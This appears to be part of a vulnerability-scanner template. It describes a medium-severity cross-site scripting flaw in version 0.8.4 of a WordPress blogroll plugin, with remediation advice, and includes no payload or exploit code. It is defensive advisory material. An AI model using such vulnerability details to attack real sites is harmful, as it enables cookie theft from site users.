  author: DhiyaneshDK
  severity: medium
  description: |
    WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time version 0.8.4 is vulnerable; prior versions may also be affected.
  remediation: Update to plugin version 0.8.5 or latest
